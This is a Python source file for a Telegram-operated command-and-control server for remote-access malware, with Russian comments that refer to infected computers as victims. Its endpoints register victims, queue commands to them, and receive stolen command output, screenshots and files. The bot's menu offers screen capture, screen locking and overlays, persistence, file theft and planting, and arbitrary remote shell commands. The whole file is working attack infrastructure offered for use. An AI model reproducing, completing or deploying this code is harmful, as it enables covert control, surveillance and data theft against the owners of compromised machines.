# language: Python, file: main.py
from fastapi import FastAPI, Request, HTTPException
from pydantic import BaseModel
from aiogram import Bot, Dispatcher, F
from aiogram.types import (Update, Message, CallbackQuery,
                           InlineKeyboardMarkup, InlineKeyboardButton,
                           BufferedInputFile)
from aiogram.filters import Command
import os, base64, db

BOT_TOKEN   = os.getenv("BOT_TOKEN", "")
ADMIN_ID    = int(os.getenv("ADMIN_ID", "0"))
WEBHOOK_SEC = os.getenv("WEBHOOK_SECRET", "change_me")
PUBLIC_URL  = os.getenv("RENDER_EXTERNAL_URL", "").rstrip("/")

if not BOT_TOKEN or not ADMIN_ID:
    raise RuntimeError("BOT_TOKEN and ADMIN_ID must be set")

bot = Bot(BOT_TOKEN)
dp  = Dispatcher()
app = FastAPI()

# ============================================================
# C2 МОДЕЛИ
# ============================================================
class RegisterReq(BaseModel):
    vid: str
    hostname: str = ""
    user: str = ""
    os: str = ""

class PollReq(BaseModel):
    vid: str

class ResultReq(BaseModel):
    vid: str
    output: str = ""
    photo_b64: str = ""   # если жертва шлёт скриншот
    file_name: str = ""   # если жертва шлёт файл
    file_b64: str = ""

# ============================================================
# C2 ЭНДПОИНТЫ
# ============================================================
@app.post("/register")
async def register(req: RegisterReq):
    db.register(req.vid, {"hostname": req.hostname, "user": req.user, "os": req.os})
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🖥 Меню", callback_data=f"menu:{req.vid}")]
    ])
    try:
        await bot.send_message(
            ADMIN_ID,
            f"🟢 *Новая жертва*\n`{req.vid}`\n"
            f"{req.user}@{req.hostname}\n{req.os}",
            parse_mode="Markdown", reply_markup=kb,
        )
    except Exception:
        pass
    return {"ok": True}

@app.post("/poll")
async def poll(req: PollReq):
    if req.vid not in db.victims:
        raise HTTPException(404, "unknown victim")
    db.touch(req.vid)
    return {"commands": db.pop_commands(req.vid)}

@app.post("/result")
async def result(req: ResultReq):
    vid = req.vid

    # текст
    if req.output:
        db.push_result(vid, req.output)
        try:
            await bot.send_message(ADMIN_ID, f"`{vid}`\n```\n{req.output[:3500]}\n```",
                                   parse_mode="Markdown")
        except Exception:
            pass

    # фото
    if req.photo_b64:
        try:
            raw = base64.b64decode(req.photo_b64)
            await bot.send_photo(ADMIN_ID, BufferedInputFile(raw, filename="shot.jpg"),
                                 caption=f"📷 {vid}")
        except Exception as e:
            await bot.send_message(ADMIN_ID, f"[-] photo error: {e}")

    # файл
    if req.file_b64 and req.file_name:
        try:
            raw = base64.b64decode(req.file_b64)
            await bot.send_document(ADMIN_ID, BufferedInputFile(raw, filename=req.file_name),
                                    caption=f"📄 {vid}")
        except Exception as e:
            await bot.send_message(ADMIN_ID, f"[-] file error: {e}")

    return {"ok": True}

# ============================================================
# МЕНЮ
# ============================================================
def menu_kb(vid: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📷 Фото экрана",   callback_data=f"cmd:{vid}:screenshot"),
         InlineKeyboardButton(text="🖥 Рабочий стол",   callback_data=f"cmd:{vid}:desktop")],
        [InlineKeyboardButton(text="📂 Файлы",         callback_data=f"menu_files:{vid}"),
         InlineKeyboardButton(text="⚙️ Процессы",      callback_data=f"cmd:{vid}:ps")],
        [InlineKeyboardButton(text="🔒 Lock",          callback_data=f"cmd:{vid}:lock"),
         InlineKeyboardButton(text="💀 Overlay",        callback_data=f"cmd:{vid}:overlay")],
        [InlineKeyboardButton(text="🔁 Persist",       callback_data=f"cmd:{vid}:persist"),
         InlineKeyboardButton(text="🗑 Убить",          callback_data=f"cmd:{vid}:exit")],
        [InlineKeyboardButton(text="💻 Shell",         callback_data=f"input:{vid}:shell")],
    ])

def files_kb(vid: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📥 Скачать файл",  callback_data=f"input:{vid}:download")],
        [InlineKeyboardButton(text="📤 Создать файл",  callback_data=f"input:{vid}:createfile")],
        [InlineKeyboardButton(text="🗂 Список диска",  callback_data=f"cmd:{vid}:lsdesktop")],
        [InlineKeyboardButton(text="⬅️ Назад",         callback_data=f"menu:{vid}")],
    ])

@dp.message(Command("start"))
async def cmd_start(msg: Message):
    if msg.from_user.id != ADMIN_ID: return
    await msg.answer(
        "C2 Bot v2\n\n"
        "/victims — список жертв\n"
        "Или жми кнопки в уведомлении о новой жертве."
    )

@dp.message(Command("victims"))
async def cmd_victims(msg: Message):
    if msg.from_user.id != ADMIN_ID: return
    vs = db.list_victims()
    if not vs:
        await msg.answer("Нет жертв.")
        return
    for vid, info in vs:
        mark = "🟢" if db.is_online(vid) else "⚫"
        text = (f"{mark} `{vid}`\n"
                f"{info['info'].get('user','?')}@{info['info'].get('hostname','?')}")
        await msg.answer(text, parse_mode="Markdown", reply_markup=menu_kb(vid))

# ============================================================
# CALLBACK'И
# ============================================================
@dp.callback_query(F.data.startswith("menu:"))
async def cb_menu(cb: CallbackQuery):
    if cb.from_user.id != ADMIN_ID: return
    vid = cb.data.split(":", 1)[1]
    await cb.message.edit_text(f"Меню `{vid}`", parse_mode="Markdown",
                               reply_markup=menu_kb(vid))
    await cb.answer()

@dp.callback_query(F.data.startswith("menu_files:"))
async def cb_files(cb: CallbackQuery):
    if cb.from_user.id != ADMIN_ID: return
    vid = cb.data.split(":", 1)[1]
    await cb.message.edit_text(f"Файлы `{vid}`", parse_mode="Markdown",
                               reply_markup=files_kb(vid))
    await cb.answer()

@dp.callback_query(F.data.startswith("cmd:"))
async def cb_cmd(cb: CallbackQuery):
    if cb.from_user.id != ADMIN_ID: return
    _, vid, cmd = cb.data.split(":", 2)
    mapping = {
        "screenshot": "screenshot",
        "desktop":    "desktop",
        "ps":         "shell tasklist",
        "lock":       "lock",
        "overlay":    "overlay",
        "persist":    "persist",
        "exit":       "exit",
        "lsdesktop":  'shell dir "%USERPROFILE%\\Desktop"',
    }
    wire = mapping.get(cmd, cmd)
    if db.enqueue(vid, wire):
        await cb.answer(f"→ {cmd}")
        await cb.message.answer(f"[+] Отправлено: `{wire}`", parse_mode="Markdown")
    else:
        await cb.answer("жертва не найдена", show_alert=True)

# ============================================================
# ВВОД ПАРАМЕТРОВ (shell, download, createfile)
# ============================================================
# простая очередь ожидания ввода: {admin_msg_id: (vid, action)}
pending_input: dict[int, tuple[str, str]] = {}

@dp.callback_query(F.data.startswith("input:"))
async def cb_input(cb: CallbackQuery):
    if cb.from_user.id != ADMIN_ID: return
    _, vid, action = cb.data.split(":", 2)
    prompts = {
        "shell":      "Введи shell-команду:",
        "download":   "Введи путь к файлу на жертве:",
        "createfile": "Введи: `<путь>|<текст>` — например `C:\\\\test.txt|hello`",
    }
    sent = await cb.message.answer(prompts.get(action, "Введи значение:"))
    pending_input[sent.message_id] = (vid, action)
    await cb.answer()

@dp.message(F.text)
async def on_text(msg: Message):
    if msg.from_user.id != ADMIN_ID: return

    # ищем, ждём ли ввода для этого сообщения-ответа
    target = None
    for mid, (vid, action) in list(pending_input.items()):
        # если пользователь ответил reply'ом на сообщение-запрос
        if msg.reply_to_message and msg.reply_to_message.message_id == mid:
            target = (mid, vid, action)
            break

    if target:
        mid, vid, action = target
        pending_input.pop(mid, None)
        text = msg.text
        if action == "shell":
            db.enqueue(vid, f"shell {text}")
        elif action == "download":
            db.enqueue(vid, f"download {text}")
        elif action == "createfile":
            if "|" in text:
                path, content = text.split("|", 1)
                b64 = base64.b64encode(content.encode()).decode()
                db.enqueue(vid, f"createfile {path} {b64}")
            else:
                await msg.answer("Формат: путь|содержимое")
                return
        await msg.answer(f"[+] → `{vid}`: {action}", parse_mode="Markdown")
        return

    # если это не ответ — это обычное сообщение, не трогаем
    # (можно сделать default handler)

# ============================================================
# WEBHOOK
# ============================================================
@app.post("/telegram/webhook")
async def telegram_webhook(request: Request):
    if request.headers.get("X-Telegram-Bot-Api-Secret-Token", "") != WEBHOOK_SEC:
        raise HTTPException(401)
    update = Update.model_validate(await request.json(), context={"bot": bot})
    await dp.feed_update(bot, update)
    return {"ok": True}

@app.on_event("startup")
async def on_startup():
    if PUBLIC_URL:
        await bot.set_webhook(f"{PUBLIC_URL}/telegram/webhook",
                              secret_token=WEBHOOK_SEC,
                              drop_pending_updates=True)

@app.get("/")
async def root():
    return {"ok": True}
